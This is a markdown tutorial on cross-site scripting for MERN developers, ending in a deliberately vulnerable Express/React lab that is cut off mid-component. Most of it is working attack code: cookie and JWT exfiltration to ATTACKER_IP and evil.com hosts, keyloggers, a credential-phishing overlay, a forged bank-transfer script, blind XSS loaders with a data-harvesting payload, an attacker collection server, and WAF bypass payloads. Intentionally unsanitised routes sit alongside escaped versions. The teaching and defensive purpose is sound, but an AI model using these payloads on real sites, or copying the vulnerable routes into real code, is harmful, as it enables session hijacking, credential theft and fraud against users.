# 🎯 Cross-Site Scripting (XSS) — Complete Notes + MERN Lab

### Every attack type explained + React/Express lab you run right now

> **You already know:** SQL Injection from previous notes.
> **This file covers:** XSS from basics to advanced — every type, every payload, every bypass.
> **Why XSS matters for MERN devs:** React protects you by default BUT only if you use it correctly.
> One `dangerouslySetInnerHTML` or `eval()` breaks everything.

---

## 📚 Table of Contents

1. [What is XSS — Really?](#1-what-is-xss)
2. [The 3 Types of XSS](#2-the-3-types-of-xss)
3. [Proof of Concept — What Attackers Actually Do](#3-proof-of-concept)
4. [How to Find XSS Endpoints](#4-how-to-find-xss-endpoints)
5. [XSS Payload Arsenal](#5-xss-payload-arsenal)
6. [XSS in Special Contexts](#6-xss-in-special-contexts)
7. [XSS in Files (SVG, XML, Markdown, CSS)](#7-xss-in-files)
8. [Blind XSS](#8-blind-xss)
9. [Mutated XSS (mXSS)](#9-mutated-xss)
10. [WAF Bypass Techniques](#10-waf-bypass)
11. [MERN Lab — Full React + Express XSS Lab](#11-mern-lab)
12. [Testing with Burp Suite](#12-testing-with-burp)
13. [Defense — Fix Every XSS Type](#13-defense)

---

## 1. What is XSS — Really?

### The Core Concept

As a React/JS developer, you already write JavaScript that runs in browsers.
XSS means an **attacker's JavaScript runs in OTHER users' browsers** on YOUR website.

```javascript
// YOUR JavaScript (you control this):
document.getElementById('btn').addEventListener('click', () => {
  alert('You clicked!')
})

// ATTACKER'S JavaScript (runs in victim's browser because of XSS):
document.location = 'https://evil.com/steal?cookie=' + document.cookie
// Victim's browser sends their cookies to attacker!
// Victim doesn't see anything suspicious.
```

### Why XSS is So Dangerous

```
When attacker's JS runs in victim's browser, they can:

READ:    document.cookie          → session tokens, auth tokens
         localStorage             → JWT tokens, user data
         sessionStorage           → more tokens
         document.body.innerHTML  → everything on the page
         form values              → passwords being typed
         credit card numbers      → payment forms

DO:      fetch('/api/transfer', { method: 'POST', body: ... })
         → Make API calls AS the victim (with their cookies/tokens)
         → Transfer money, change email, change password

RECORD:  document.onkeypress = (e) => sendToAttacker(e.key)
         → Keylog everything the victim types

REDIRECT: window.location = 'https://fake-bank.com'
          → Send victim to phishing page

STAY:    Create a persistent backdoor via service workers
         → XSS that survives page refreshes!
```

### The Same-Origin Policy Connection

```
Without XSS:
  evil.com cannot access cookies/data from bank.com
  Browser's Same-Origin Policy prevents it

With XSS:
  Attacker injects script INTO bank.com
  That script IS running on bank.com's origin
  Same-Origin Policy doesn't block it!
  Script can access bank.com's cookies, make API calls, read the DOM

This is why XSS is called "Cross-SITE" — attacker's code crosses
from their site into your site's origin
```

### React Developer's Key Insight

```jsx
// React AUTOMATICALLY escapes this → SAFE:
const userInput = '<script>alert(1)</script>'
return <div>{userInput}</div>
// Renders as text: "<script>alert(1)</script>"
// Browser shows it as TEXT, not code

// React does NOT escape this → DANGEROUS:
return <div dangerouslySetInnerHTML={{ __html: userInput }} />
// Renders as HTML: script tag executes!

// The name "dangerouslySetInnerHTML" is literally a warning
// Only use it with sanitized content

// Other dangerous patterns in MERN:
eval(userInput) // Direct execution
document.write(userInput) // Writes HTML to page
element.innerHTML = userInput // Sets HTML directly
```

---

## 2. The 3 Types of XSS

### Type 1: Reflected XSS

```
HOW IT WORKS:
  1. Attacker crafts a URL with malicious script in it
  2. Victim clicks the URL
  3. Server "reflects" the input back in the response
  4. Browser executes the script

FLOW:
  Attacker → crafts URL: https://shop.com/search?q=<script>alert(1)</script>
  Victim   → clicks the URL
  Server   → responds: "Search results for: <script>alert(1)</script>"
  Browser  → renders the HTML, executes the script!

WHY IT'S REFLECTED:
  Input goes IN via URL
  Same input comes OUT in the page response
  Server "reflects" it back

REAL DANGER:
  Attacker sends victim a link via:
  - Email: "Click here for your Amazon order"
  - SMS: "Verify your account: [link]"
  - WhatsApp: "Check this out"
  Victim trusts the domain (it IS the real site)
  But the URL contains malicious payload
```

```javascript
// Vulnerable Express route (reflected XSS):
app.get('/search', (req, res) => {
  const query = req.query.q
  // ❌ DANGEROUS: user input directly in HTML
  res.send(`<html>
    <body>
      <h1>Results for: ${query}</h1>
    </body>
  </html>`)
})

// Attack URL:
// http://localhost:5000/search?q=<script>fetch('http://evil.com/steal?c='+document.cookie)</script>
```

### Type 2: Stored XSS (Persistent)

```
HOW IT WORKS:
  1. Attacker saves malicious script to database (via comment, profile, etc.)
  2. Script sits in database waiting
  3. ANY user who views that content → script executes in THEIR browser
  4. One injection → affects thousands of users!

FLOW:
  Attacker → POST /comments Body: { text: "<script>alert(1)</script>" }
  Database → stores the script text
  Victim 1 → visits page, script executes
  Victim 2 → visits page, script executes
  Victim 3 → visits page, script executes
  ... ALL visitors affected!

WHY IT'S STORED:
  Payload survives in the database
  Doesn't need victim to click a special URL
  Most dangerous type because:
  - Affects ALL users automatically
  - No suspicious URL to notice
  - Can persist for days/weeks/years

REAL WORLD EXAMPLES:
  - MySpace Worm (Samy worm): One stored XSS added attacker as friend for 1 million users in 20 hours
  - British Airways XSS: Payment data stolen from 380,000 customers
  - eBay stored XSS: Redirected users to phishing pages
```

```javascript
// Vulnerable stored XSS - comment system:
// Saving (no sanitization):
app.post('/comments', async (req, res) => {
  const { text, author } = req.body
  // ❌ DANGEROUS: stores raw HTML/JS
  await db.collection('comments').insertOne({ text, author })
  res.json({ success: true })
})

// Displaying (serves stored XSS to all visitors):
app.get('/comments', async (req, res) => {
  const comments = await db.collection('comments').find().toArray()
  const html = comments.map((c) => `<div>${c.text}</div>`).join('')
  // ❌ When browser renders this, any <script> tags execute!
  res.send(`<html><body>${html}</body></html>`)
})
```

### Type 3: DOM-Based XSS

```
HOW IT WORKS:
  1. Vulnerability is in FRONTEND JavaScript, not server
  2. Script reads from URL/DOM and writes to page unsafely
  3. Payload never reaches the server!
  4. Server logs show nothing suspicious

FLOW:
  Attacker → crafts URL: https://app.com/#<img src=x onerror=alert(1)>
  Victim   → visits URL
  Server   → serves normal page (doesn't see the # part!)
  Frontend JS → reads location.hash, writes to DOM unsafely
  Browser  → executes the injected script

WHY IT'S DOM-BASED:
  The Document Object Model is modified directly by JS
  Server never sees the malicious input
  Can't be fixed on server-side alone!

COMMON DOM XSS SOURCES (where data comes from):
  location.href, location.hash, location.search
  document.referrer
  window.name
  localStorage, sessionStorage (if user-controlled)

COMMON DOM XSS SINKS (where data goes unsafely):
  element.innerHTML = ...    ← writes HTML!
  document.write(...)        ← writes HTML!
  eval(...)                  ← executes code!
  setTimeout(string, ...)    ← executes string as code!
  location.href = ...        ← if user-controlled = open redirect/XSS
  $.html(), $(selector) ...  ← jQuery can be vulnerable too
```

```javascript
// Vulnerable DOM XSS - frontend JavaScript:
// URL: https://app.com/search#<img src=x onerror=alert(1)>

// ❌ DANGEROUS: Reads from location.hash, writes to DOM
const search = location.hash.substring(1) // Gets: <img src=x onerror=alert(1)>
document.getElementById('results').innerHTML = `Results for: ${search}`
// Browser renders the <img> tag, onerror fires, XSS!

// Another example:
const name = new URLSearchParams(location.search).get('name')
document.querySelector('.welcome').innerHTML = `Hello ${name}!`
// URL: /page?name=<script>alert(1)</script>
// innerHTML interprets it as HTML → XSS!

// ✅ SAFE:
document.getElementById('results').textContent = `Results for: ${search}`
// textContent treats everything as TEXT, not HTML
```

---

## 3. Proof of Concept

### What Attackers ACTUALLY Do (Not Just alert(1))

The repo says: Don't just use `alert(1)` — demonstrate REAL impact!

#### Data Grabber — Steal Cookies

```html
<!-- Steal session cookie and send to attacker's server: -->
<script>
  document.location = 'http://ATTACKER_IP:8080/grab?c=' + document.cookie
</script>

<!-- Silent version (no page redirect, harder to notice): -->
<script>
  new Image().src = 'http://ATTACKER_IP:8080/steal?c=' + document.cookie
</script>

<!-- Steal localStorage (JWT tokens!): -->
<script>
  new Image().src = 'http://ATTACKER_IP:8080/steal?t=' + localStorage.getItem('token')
</script>

<!-- Steal EVERYTHING in localStorage: -->
<script>
  var data = JSON.stringify(localStorage)
  fetch('http://ATTACKER_IP:8080/steal', {
    method: 'POST',
    mode: 'no-cors',
    body: data,
  })
</script>
```

**Your simple attacker server to receive stolen data:**

```javascript
// attacker_server.js — Run this on YOUR machine to catch stolen cookies
// node attacker_server.js

const express = require('express')
const app = express()
app.use(express.json())

app.get('/grab', (req, res) => {
  console.log('\n🎯 COOKIE STOLEN!')
  console.log('From IP:', req.ip)
  console.log('Cookie:', decodeURIComponent(req.query.c || ''))
  console.log('Token:', req.query.t || 'N/A')
  console.log('Time:', new Date().toISOString())
  res.send('<img src="https://picsum.photos/1/1">') // Return tiny image, victim doesn't notice
})

app.post('/steal', (req, res) => {
  console.log('\n🎯 DATA STOLEN!')
  console.log('Body:', JSON.stringify(req.body, null, 2))
  res.status(200).end()
})

app.listen(8080, () => {
  console.log('🎣 Attacker server listening on :8080')
  console.log('Waiting for stolen cookies...\n')
})
```

#### CORS Exfiltration

```html
<!-- More reliable than redirect — uses fetch, victim stays on page: -->
<script>
  fetch('http://ATTACKER_IP:8080/steal', {
    method: 'POST',
    mode: 'no-cors', // no-cors bypasses CORS preflight!
    body: document.cookie,
  })
</script>
```

#### Keylogger

```html
<!-- Log every key the victim presses: -->
<img
  src="x"
  onerror='
  document.onkeypress=function(e){
    fetch("http://ATTACKER_IP:8080/keys?k="+String.fromCharCode(e.which))
  },
  this.remove();
'
/>

<!-- More stealthy keylogger: -->
<script>
  var captured = ''
  document.addEventListener('keypress', function (e) {
    captured += String.fromCharCode(e.which)
    // Send in batches (less network noise)
    if (captured.length >= 10) {
      new Image().src = 'http://ATTACKER_IP:8080/keys?data=' + encodeURIComponent(captured)
      captured = ''
    }
  })
</script>
```

#### UI Redressing — Fake Login Page

```html
<!-- Replace entire page with fake login form: -->
<script>
  // Change URL to look like login page (victim doesn't notice!)
  history.replaceState(null, null, '/login')

  // Replace entire page content:
  document.body.innerHTML = `
    <div style="font-family:Arial;max-width:400px;margin:100px auto;padding:20px;border:1px solid #ddd">
      <h2>Session Expired</h2>
      <p>Please login to continue</p>
      <form onsubmit="steal(event)">
        <input type="text" placeholder="Email" id="e" style="width:100%;padding:8px;margin:5px 0"><br>
        <input type="password" placeholder="Password" id="p" style="width:100%;padding:8px;margin:5px 0"><br>
        <button type="submit" style="width:100%;padding:8px;background:#1877f2;color:white;border:none">Login</button>
      </form>
    </div>
  `

  function steal(e) {
    e.preventDefault()
    var email = document.getElementById('e').value
    var pass = document.getElementById('p').value
    // Send to attacker's server
    fetch('http://ATTACKER_IP:8080/phished?e=' + email + '&p=' + pass, { mode: 'no-cors' })
    // Redirect to real login (victim thinks they just logged in)
    window.location = 'https://real-site.com/dashboard'
  }
</script>
```

#### Make API Calls AS the Victim

```html
<!-- With stored XSS in a banking app, do a transfer AS the victim: -->
<script>
  // Attacker's XSS makes requests using victim's authenticated session
  fetch('/api/transfer', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    credentials: 'include', // Include victim's session cookies!
    body: JSON.stringify({
      amount: 10000,
      toAccount: 'ATTACKER_ACCOUNT',
    }),
  })
    .then((r) => r.json())
    .then((data) => {
      // Transfer complete! Send confirmation to attacker:
      new Image().src = 'http://ATTACKER_IP:8080/done?result=' + JSON.stringify(data)
    })
</script>
```

---

## 4. How to Find XSS Endpoints

### What to Look For

Every place where **user input appears on the page** is a potential XSS point:

```
SEARCH BOXES:     "You searched for: [INPUT]"
ERROR MESSAGES:   "User [INPUT] not found"
PROFILE DISPLAY:  Name, bio, username displayed anywhere
COMMENTS:         Any comment/review/message system
URL PARAMETERS:   "Welcome back, [NAME from URL]!"
HEADERS:          Referer, User-Agent displayed in logs/pages
FILE NAMES:       Uploaded file names displayed
IMPORT FEATURES:  CSV/XML import that shows field names
MARKDOWN/RICH TEXT: Any editor that renders HTML
```

### Testing Strategy

```javascript
// Step 1: Basic alert test (confirm execution)
<script>alert(1)</script>

// Step 2: Better test (shows you WHERE it's executing)
<script>alert(document.domain.concat("\n").concat(window.origin))</script>
// Shows: "shop.example.com\nhttps://shop.example.com"
// Confirms XSS runs in the right context

// Step 3: console.log (for stored XSS - doesn't interrupt UX)
<script>console.log("XSS found in search bar")</script>

// Step 4: Debugger (opens DevTools paused, great for understanding context)
<script>debugger;</script>

// Step 5: Prove real impact
<script>document.location='http://attacker.com?c='+document.cookie</script>
```

### Finding DOM XSS (Frontend-Only)

```javascript
// Look for these "sinks" in React/JS code:
// These are places where data gets written as HTML

// 1. innerHTML:
element.innerHTML = userControlledValue // ← DANGEROUS

// 2. dangerouslySetInnerHTML in React:
;<div dangerouslySetInnerHTML={{ __html: value }} /> // ← CHECK THIS

// 3. jQuery:
$(selector).html(userValue) // ← DANGEROUS
$(userValue) // ← Can create elements!

// 4. document.write:
document.write(userValue) // ← DANGEROUS

// 5. eval:
eval(userValue) // ← VERY DANGEROUS

// 6. URL-based sources:
const name = location.search.split('name=')[1]
document.querySelector('.name').innerHTML = name // ← DOM XSS!

// Tools to find DOM XSS:
// - Chrome DevTools: search all JS files for 'innerHTML'
// - Ctrl+Shift+F in DevTools: search across all loaded JS
// - DOMdig: automated DOM XSS scanner
```

---

## 5. XSS Payload Arsenal

### Basic Payloads

```html
<!-- Classic (might be filtered): -->
<script>alert('XSS')</script>

<!-- Works when > is filtered - uses event: -->
<img src=x onerror=alert('XSS')>

<!-- No quotes needed: -->
<img src=x onerror=alert(1)>

<!-- SVG version: -->
<svg onload=alert(1)>
<svg/onload=alert('XSS')>

<!-- Div with pointer events: -->
<div onpointerover="alert(1)">HOVER ME</div>
<div onpointerdown="alert(1)">CLICK ME</div>

<!-- Body tag: -->
<body onload=alert(1)>
```

### Filter Bypass Payloads

```html
<!-- When script tag is filtered, duplicate inner tag trick: -->
<scr<script>ipt>alert('XSS')</scr<script>ipt>
<!-- Filter removes inner "script" → leaves: <script>alert('XSS')</script> -->

<!-- When angle brackets are encoded: -->
<script>\u0061lert('XSS')</script>
<!-- \u0061 = 'a' in unicode → alert still executes! -->

<!-- When single/double quotes filtered: -->
<script>alert(String.fromCharCode(88,83,83))</script>
<!-- 88=X, 83=S, 83=S → alert('XSS') without quotes -->

<!-- Using eval with hex encoding: -->
<script>eval('\x61lert(\'XSS\')')</script>
<!-- \x61 = 'a' → eval('alert(\'XSS\')') -->

<!-- When space is filtered: -->
<svgonload=alert(1)>
<!-- Some parsers accept attributes without space -->

<!-- Closing previous attribute/tag: -->
"><script>alert('XSS')</script>
<!-- Breaks out of current attribute context -->
```

### HTML5 Event Payloads

```html
<!-- Autofocus (fires without user interaction): -->
<input autofocus onfocus=alert(1)>
<select autofocus onfocus=alert(1)>
<textarea autofocus onfocus=alert(1)>

<!-- Media elements: -->
<video/poster/onerror=alert(1)>
<video src=_ onloadstart="alert(1)">
<audio src onloadstart=alert(1)>

<!-- Details element (fires when opened): -->
<details/open/ontoggle="alert(1)">

<!-- Marquee (fires on start): -->
<marquee onstart=alert(1)>text</marquee>

<!-- Body touch events (mobile): -->
<body ontouchstart=alert(1)>
<body ontouchend=alert(1)>

<!-- New in modern browsers: -->
<input type="hidden" oncontentvisibilityautostatechange="alert(1)" style="content-visibility:auto">
```

### Context-Based Payloads

```javascript
// When injected inside a JavaScript string:
// Page has: var x = 'USER_INPUT';

// Break out of string + execute:
'; alert(1); //
'-alert(1)-'
\'; alert(1);//

// When inside a function call:
// Page has: onclick="doThing('USER_INPUT')"
'; alert(1); //
</script><script>alert(1)</script>

// When output is in uppercase:
// Can't use lowercase 'alert'
// Use HTML entities instead:
<IMG SRC=1 ONERROR=&#X61;&#X6C;&#X65;&#X72;&#X74;(1)>
// &#X61; = 'a', &#X6C; = 'l', etc.
// Browser decodes entities → runs: onerror=alert(1)
```

---

## 6. XSS in Special Contexts

### JavaScript: URI

```javascript
// In anchor href, location.href, etc.:
// These all execute JavaScript when clicked/processed:

javascript:alert(1)
javascript:prompt(1)
javascript:confirm('XSS')

// Encoded versions (bypass filters):
%6A%61%76%61%73%63%72%69%70%74%3Aalert(1)  // URL encoded
&#106;&#97;&#118;&#97;&#115;&#99;&#114;...  // HTML entity encoded
\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x3aalert(1)  // Hex

// Bypass with whitespace in "javascript:":
java%0ascript:alert(1)   // Newline between java and script
java%09script:alert(1)   // Tab between java and script
java%0dscript:alert(1)   // Carriage return

// When injected in href:
<a href="javascript:alert(1)">Click me</a>

// Works in many React routing libraries too if href not validated!
```

### Data: URI

```javascript
// data: URIs can contain HTML with scripts:
data: (text / html, (<script>alert(1)</script>))

// Base64 encoded:
data: text / html
;(base64,
  PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg ==
  (
    // Decode: <script>alert(1)</script>

    // In script src:
    <script src="data:;base64,YWxlcnQoMSk="></script>
  ))
// Base64 decodes to: alert(1)

// Where this appears:
// - img src
// - iframe src
// - script src
// - link href
```

### XSS in Hidden Inputs

```html
<!-- Hidden inputs aren't visible but can still have event handlers: -->
<input type="hidden" accesskey="X" onclick="alert(1)" />
<!-- Press CTRL+SHIFT+X to trigger onclick! -->
<!-- Less practical for mass exploitation, useful for stored XSS in admin panels -->

<!-- Newer browsers: -->
<input
  type="hidden"
  oncontentvisibilityautostatechange="alert(1)"
  style="content-visibility:auto"
/>
<!-- Fires automatically when element becomes visible! -->
```

---

## 7. XSS in Files

### XSS in SVG Files

SVG files are XML and can contain JavaScript! If your app displays uploaded SVGs:

```xml
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">

<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
  <!-- Looks like an innocent SVG shape -->
  <polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>

  <!-- But contains executable JavaScript! -->
  <script type="text/javascript">
    alert(document.domain);
    // In real attack: steal cookies, make API calls, etc.
  </script>
</svg>
```

**Short SVG payloads:**

```xml
<!-- Minimal XSS SVG: -->
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"/>

<!-- Using CDATA to hide from XML parser: -->
<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>
<svg><title><![CDATA[</title><script>alert(2)</script>]]></svg>
```

**When does this matter?**

```
If your app:
  - Allows SVG file uploads
  - Renders SVG inline (not as <img>)
  - Serves SVG files from same origin
  → XSS possible!

Safe: <img src="user.svg">  (image context, scripts don't run)
Unsafe: <object data="user.svg"> or inline SVG  (scripts run!)
```

### XSS in XML

```xml
<!-- XML can contain scripts via XHTML namespace: -->
<html>
<head></head>
<body>
  <something:script xmlns:something="http://www.w3.org/1999/xhtml">
    alert(1)
  </something:script>
</body>
</html>

<!-- CDATA bypass in XML: -->
<name>
  <value><![CDATA[<script>confirm(document.domain)</script>]]></value>
</name>
```

### XSS in Markdown

```markdown
[Click me](<javascript:alert(document.cookie)>)

[link](data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K)

[a](javascript:window.onerror=alert;throw%201)
```

**When does this matter?**

```
Markdown renderers that allow raw HTML:
  - marked.js (without sanitization)
  - showdown.js
  - Any renderer with html: true option

Safe: marked.parse(input, { sanitize: true })   ← deprecated
Better: DOMPurify.sanitize(marked.parse(input))  ← correct approach
```

### XSS in CSS

```html
<!-- CSS can load external resources and sometimes execute code: -->
<style>
  div {
    background-image: url('data:image/jpg;base64,
    <\/style><svg/onload=alert(document.domain)>');
  }
</style>
<!-- Breaks out of CSS context into HTML!
     The <\/style> closes the style tag
     Then SVG executes the XSS -->
```

---

## 8. Blind XSS

### What is Blind XSS?

```
Normal XSS: You inject, you SEE it execute in your own browser
Blind XSS:  You inject, someone ELSE's browser executes it (admin, support staff)
            You never see it execute directly!

WHERE BLIND XSS TRIGGERS:
  Admin panels (admin views user-submitted content)
  Support ticket systems (support agent opens your ticket)
  Log viewers (admin checks error logs with your injected UA)
  Order/feedback review systems
  Analytics dashboards (admin sees your logged activity)

EXAMPLE:
  You submit support ticket: "Hello <script src='https://evil.com/x.js'></script>"
  Support agent opens ticket in admin panel
  YOUR script executes in ADMIN's browser
  You get admin's cookies = admin account takeover!
```

### Blind XSS Payloads

```html
<!-- Load a remote script (your server serves the payload): -->
"><script src="https://YOUR-SERVER.com/xss.js"></script>

<!-- Using jQuery if available: -->
<script>$.getScript("//YOUR-SERVER.com/xss.js")</script>

<!-- Short loader: -->
"><script src=//YOUR-SERVER.com></script>

<!-- img onerror version: -->
"><img src=x onerror="var s=document.createElement('script');s.src='//YOUR-SERVER.com/x.js';document.head.appendChild(s)">
```

**Your Blind XSS Catcher (payload that runs on admin's browser):**

```javascript
// xss.js - hosted on YOUR server, executes in victim's browser

;(function () {
  // Collect everything valuable
  var payload = {
    cookies: document.cookie,
    localStorage: JSON.stringify(localStorage),
    sessionStorage: JSON.stringify(sessionStorage),
    url: window.location.href,
    title: document.title,
    userAgent: navigator.userAgent,
    timestamp: new Date().toISOString(),
    // Take a screenshot of the page (shows you the admin panel!)
    html: document.documentElement.outerHTML.substring(0, 5000),
  }

  // Send back to YOUR server
  var img = new Image()
  img.src = 'https://YOUR-SERVER.com/blind?data=' + encodeURIComponent(JSON.stringify(payload))

  // Also send via fetch (more data):
  fetch('https://YOUR-SERVER.com/blind', {
    method: 'POST',
    mode: 'no-cors',
    body: JSON.stringify(payload),
    headers: { 'Content-Type': 'application/json' },
  })
})()
```

### Where to Inject for Blind XSS

```
1. Name/email fields in registration forms
   → Admin might view user list

2. Support ticket / contact form message body
   → Support agent opens ticket

3. User-Agent header (change in Burp)
   → If app logs User-Agent and admin views logs

4. Referer header (change in Burp)
   → Analytics showing where traffic came from

5. Comment/feedback on products
   → Admin/moderator reviews comments

6. Error messages that get logged
   → Admin opens error log viewer

7. File name of uploaded file
   → If admin sees uploaded file names

8. Profile bio/description
   → If admins can view profiles
```

### XSS Hunter (Professional Blind XSS Tool)

```
XSS Hunter: A service that:
  1. Gives you a unique payload/domain
  2. When payload fires, automatically:
     - Takes screenshot of the page
     - Collects cookies
     - Collects localStorage
     - Records URL
     - Records DOM
  3. Sends you an email notification!

Setup options:
  Self-hosted: github.com/mandatoryprogrammer/xsshunter-express
  Hosted:      xsshunter.trufflesecurity.com (free)

Your payload looks like:
  "><script src="https://YOUR.xsshunter.com/xss.js"></script>
```

---

## 9. Mutated XSS (mXSS)

### What is mXSS?

```
Sanitizers (like DOMPurify) clean your input.
But browsers "mutate" (change) HTML while parsing it.
Sometimes the cleaned HTML gets mutated INTO something executable!

Example:
  You input: <noscript><p title="</noscript><img src=x onerror=alert(1)>">
  Sanitizer sees: looks safe, passes it
  Browser parses it differently than sanitizer expected
  After browser mutation: <img src=x onerror=alert(1)> executes!

This is used in CVEs against Google Search and DOMPurify itself!

Key insight:
  HTML parsers (browsers) and string parsers (sanitizers) don't always agree
  Attackers exploit the difference between what sanitizer sees
  vs what browser interprets
```

---

## 10. WAF Bypass Techniques

### When the App Blocks Common Payloads

```javascript
// WAF blocks: <script>
// Alternative 1: Event handlers instead of script tag
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>

// WAF blocks: alert
// Alternative 1: Different functions
<img src=x onerror=confirm(1)>    // confirm() also pops up
<img src=x onerror=prompt(1)>     // prompt() also pops up

// Alternative 2: Construct 'alert' dynamically
<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>
// 97=a, 108=l, 101=e, 114=r, 116=t, 40=(, 49=1, 41=)
// eval('alert(1)')

// Alternative 3: Unicode
<script>\u0061\u006C\u0065\u0072\u0074(1)</script>
// \u0061=a, \u006C=l, \u0065=e, \u0072=r, \u0074=t

// WAF blocks: onerror=
// Alternative: different event
<img src=x oneonerrorrror=alert(1)>  // double keywords, filter removes one
// After filter: onerror=alert(1) - executes!

// WAF blocks: javascript:
// Encode the : and letters
java%0ascript:alert(1)   // newline in protocol
&#106;avascript:alert(1) // HTML entity for 'j'
\x6Aavascript:alert(1)  // hex for 'j'

// WAF blocks: (
// Alternative: template literals
<svg onload=alert`1`>
// Backtick calls alert with '1' as tagged template!

// WAF blocks: alert(1)
// Use: throw
<svg onload="window.onerror=eval;throw'=alert\x281\x29'">
```

---

## 11. MERN Lab — Full React + Express XSS Lab

### Setup

```bash
# Create lab
mkdir xss-lab && cd xss-lab

# Backend
mkdir server && cd server
npm init -y
npm install express cors mongoose dotenv
cd ..

# Frontend (React)
npx create-react-app client
cd client
npm install axios
cd ..
```

### Express Backend

```javascript
// server/index.js
// HOW TO RUN: node index.js
// Server on: http://localhost:5000

require('dotenv').config()
const express = require('express')
const cors = require('cors')
const mongoose = require('mongoose')

const app = express()
app.use(cors({ origin: 'http://localhost:3000', credentials: true }))
app.use(express.json())

mongoose.connect('mongodb://localhost:27017/xss_lab')

// Comment schema
const commentSchema = new mongoose.Schema({
  author: String,
  text: String,
  createdAt: { type: Date, default: Date.now },
})
const Comment = mongoose.model('Comment', commentSchema)

// ══════════════════════════════════════════════════════════════
// VULNERABLE ROUTES
// ══════════════════════════════════════════════════════════════

// VULNERABLE 1: Stored XSS - Comment system
// TEST:
//   POST /api/vuln/comments Body: {"author":"me","text":"<script>alert(1)</script>"}
//   GET  /api/vuln/comments/html → browser executes the script!

app.post('/api/vuln/comments', async (req, res) => {
  const { author, text } = req.body

  // ❌ DANGEROUS: Stores raw HTML/JS with no sanitization
  const comment = await Comment.create({ author, text })
  console.log('[STORED XSS] Stored comment:', text)

  res.json({ success: true, comment })
})

app.get('/api/vuln/comments', async (req, res) => {
  const comments = await Comment.find().sort({ createdAt: -1 })
  res.json(comments)
})

// Returns raw HTML (executes stored XSS in browser!)
app.get('/api/vuln/comments/html', async (req, res) => {
  const comments = await Comment.find().sort({ createdAt: -1 })

  // ❌ DANGEROUS: User input embedded directly in HTML response
  const html = `
    <html>
    <head><title>Comments (VULNERABLE)</title></head>
    <body>
      <h1>Comments</h1>
      ${comments
        .map(
          (c) => `
        <div style="border:1px solid #ddd;padding:10px;margin:10px">
          <strong>${c.author}</strong>: ${c.text}
        </div>
      `,
        )
        .join('')}
    </body>
    </html>
  `
  // Any <script> tag in c.text EXECUTES when browser renders this!
  res.send(html)
})

// VULNERABLE 2: Reflected XSS - Search
// TEST:
//   GET /api/vuln/search?q=<script>alert(document.domain)</script>
//   Browser executes the script from URL!

app.get('/api/vuln/search', (req, res) => {
  const { q } = req.query
  console.log('[REFLECTED XSS] Search query:', q)

  // ❌ DANGEROUS: Query reflected directly into HTML
  res.send(`
    <html>
    <body>
      <h1>Search Results for: ${q}</h1>
      <p>Found 0 results for your query.</p>
    </body>
    </html>
  `)
})

// VULNERABLE 3: XSS via JSON (for DOM XSS demo)
// Returns user data as JSON — vulnerable if frontend uses innerHTML with it

app.get('/api/vuln/profile', (req, res) => {
  const { name } = req.query

  // The JSON itself is fine...
  // But if frontend does: element.innerHTML = data.name → DOM XSS!
  res.json({
    name: name || 'Guest',
    warning: 'If frontend uses innerHTML with this data, XSS occurs!',
  })
})

// ══════════════════════════════════════════════════════════════
// SECURE ROUTES
// ══════════════════════════════════════════════════════════════

// SECURE 1: Sanitized comments
app.post('/api/secure/comments', async (req, res) => {
  const { author, text } = req.body

  // ✅ SAFE: Import sanitize-html
  // npm install sanitize-html
  // const sanitizeHtml = require('sanitize-html');
  // const cleanText = sanitizeHtml(text, {
  //   allowedTags: ['b', 'i', 'em', 'strong'],  // Only these HTML tags!
  //   allowedAttributes: {}
  // });

  // For demo without the library:
  const cleanText = text
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#x27;')

  const comment = await Comment.create({ author, text: cleanText })
  res.json({ success: true, comment, note: 'HTML escaped!' })
})

// SECURE 2: Safe search
app.get('/api/secure/search', (req, res) => {
  const { q } = req.query

  // ✅ SAFE: Escape HTML before embedding in page
  const safeQ = (q || '')
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')

  res.send(`
    <html>
    <head>
      <!-- ✅ Also set CSP header: -->
      <meta http-equiv="Content-Security-Policy" content="default-src 'self'">
    </head>
    <body>
      <h1>Search Results for: ${safeQ}</h1>
      <p>The input is HTML-escaped. Angle brackets won't execute as HTML!</p>
    </body>
    </html>
  `)
})

app.listen(5000, () => console.log('XSS Lab server on :5000'))
```

### React Frontend (Shows DOM XSS)

```jsx
// client/src/App.js
// DEMONSTRATES: React safe vs unsafe rendering

import { useState, useEffect, useRef } from 'react'
import axios from 'axios'

function App() {
  const [comments, setComments] = useState([])
  const [newComment, setNewComment] = useState('')
  const [author, setAuthor] = useState('')
  const [searchResult, setSearchResult] = useState('')
  const domXssRef = useRef(null)

  useEffect(() => {
    loadComments()
  }, [])

  const loadComments = async () => {
    const res = await axios.get('http://localhost:5000/api/vuln/comments')
    setComments(res.data)
  }

  const postComment = async () => {
    await axios.post('http://localhost:5000/api/vuln/comments', {
      author,
      text: newComment,
    })
    setNewComment('')
    loadComments()
  }

  // ══════════════════════════════════════
  // DEMO 1: React SAFE rendering
  // ══════════════════════════════════════
  const SafeComments = () => (
    <div>
      <h2>✅ React SAFE Rendering</h2>
      <p>React escapes JSX by default. Even XSS payloads are just text.</p>
      {comments.map((c) => (
        <div key={c._id} style={{ border: '1px solid green', padding: '10px', margin: '5px' }}>
          <strong>{c.author}</strong>: {c.text}
          {/* React treats {c.text} as TEXT, not HTML → SAFE! */}
        </div>
      ))}
    </div>
  )

  // ══════════════════════════════════════
  // DEMO 2: React UNSAFE rendering
  // ══════════════════════════════════════
  const UnsafeComments = () => (
    <div>
      <h2>❌ React UNSAFE Rendering (dangerouslySetInnerHTML)</h2>
